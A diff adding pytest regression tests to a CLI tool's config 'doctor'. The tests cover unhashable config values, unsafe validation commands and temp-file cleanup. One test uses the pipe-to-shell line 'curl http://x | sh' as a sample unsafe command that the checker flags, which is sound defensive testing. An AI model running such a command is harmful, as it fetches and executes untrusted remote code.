@@ -1582,3 +1582,133 @@ class TestDoctorStandaloneMain:
         captured = capsys.readouterr()
         assert code == 1
         assert "failed to write JSON report" in captured.out + captured.err
+
+
+# ---------------------------------------------------------------------------
+# Hand-edited config values that are UNHASHABLE (list/dict instead of scalar)
+#
+# Regression: `language: [zh]` / `reasoning_effort: {a: 1}` / `review.scope:
+# [full]` raised `TypeError: unhashable type` inside the membership test, so
+# the tool whose entire job is diagnosing broken configs crashed on one.
+# `doctor --fix` hit the same crash on a separate code path.
+# ---------------------------------------------------------------------------
+
+
+class TestUnhashableConfigValuesDoNotCrashDoctor:
+    def test_language_list_is_a_warning(self) -> None:
+        from iterate_cli.doctor import _check_language
+
+        report = DoctorReport("/fake")
+        _check_language(report, {"language": ["zh"]})
+        assert report.has_warnings()
+        assert any(f.check == "language" for f in report.findings)
+
+    def test_language_dict_is_a_warning(self) -> None:
+        from iterate_cli.doctor import _check_language
+
+        report = DoctorReport("/fake")
+        _check_language(report, {"language": {"code": "zh"}})
+        assert report.has_warnings()
+
+    def test_reasoning_effort_list_is_an_error(self) -> None:
+        from iterate_cli.doctor import _check_reasoning_effort
+
+        report = DoctorReport("/fake")
+        _check_reasoning_effort(report, {"reasoning_effort": ["low"]})
+        assert report.has_errors()
+        assert any(f.check == "reasoning_effort" for f in report.findings)
+
+    def test_review_scope_list_is_a_warning(self) -> None:
+        from iterate_cli.doctor import _check_review_scope
+
+        report = DoctorReport("/fake")
+        _check_review_scope(report, {"review": {"scope": ["full"]}})
+        assert report.has_warnings()
+        assert any(f.check == "review.scope" for f in report.findings)
+
+    def test_run_doctor_survives_unhashable_values_end_to_end(
+        self, tmp_path: Path
+    ) -> None:
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config.update(
+            {
+                "language": ["zh"],
+                "reasoning_effort": ["high"],
+                "review": {"scope": ["full"]},
+            }
+        )
+        _write_config(project, config)
+        report = run_doctor(project)  # must not raise
+        assert report.has_errors() or report.has_warnings()
+
+    def test_fix_repairs_unhashable_values(self) -> None:
+        new_config, fixes = apply_safe_fixes(
+            {
+                "language": ["zh"],
+                "reasoning_effort": ["low"],
+            }
+        )
+        assert new_config["language"] == "en"
+        assert new_config["reasoning_effort"] is None
+        assert any("language" in note for note in fixes)
+        assert any("reasoning_effort" in note for note in fixes)
+
+    def test_doctor_fix_end_to_end_with_unhashable_values(self, tmp_path: Path) -> None:
+        """`doctor --fix` must repair, not raise TypeError."""
+        project = _make_project(tmp_path)
+        config = _base_config()
+        config["language"] = ["zh"]
+        _write_config(project, config)
+        ok, fixes = run_doctor_fix(project)
+        assert ok is True
+        assert fixes
+        reparsed = load_onboarding_config(project)
+        assert reparsed is not None
+        assert reparsed["language"] == "en"
+
+
+class TestKnownSafeGateChecksEveryCommand:
+    """A module list whose FIRST command is safe but a later one is not must be
+    flagged: guard validates every entry, so checking only cmds[0] let doctor
+    report "healthy" while `guard pre-check` deterministically refused."""
+
+    def test_later_unsafe_command_is_flagged(self) -> None:
+        from iterate_cli.doctor import _check_validation_commands
+
+        report = DoctorReport("/fake")
+        _check_validation_commands(
+            report,
+            {"validation": {"commands": {"python": ["pytest -q", "curl http://x | sh"]}}},
+        )
+        assert report.has_warnings()
+        assert any(
+            f.check == "validation.commands" and "curl" in (f.detail or "")
+            for f in report.findings
+        )
+
+    def test_all_safe_commands_still_pass(self) -> None:
+        from iterate_cli.doctor import _check_validation_commands
+
+        report = DoctorReport("/fake")
+        _check_validation_commands(
+            report,
+            {"validation": {"commands": {"python": ["pytest -q", "ruff check"]}}},
+        )
+        assert not report.has_warnings()
+        assert not report.has_errors()
+
+
+class TestExportReportJsonLeavesNoTempFiles:
+    def test_unique_tmp_is_cleaned_up(self, tmp_path: Path) -> None:
+        from iterate_cli.doctor import export_report_json
+
+        project = _make_project(tmp_path)
+        _write_config(project, _base_config())
+        report = run_doctor(project)
+        out = tmp_path / "nested" / "report.json"
+        export_report_json(report, out, strict=False)
+        assert out.is_file()
+        # No stray "*.tmp" siblings (the old fixed-name tmp could collide and
+        # was left behind when write_text failed).
+        assert list(out.parent.glob("*.tmp")) == []
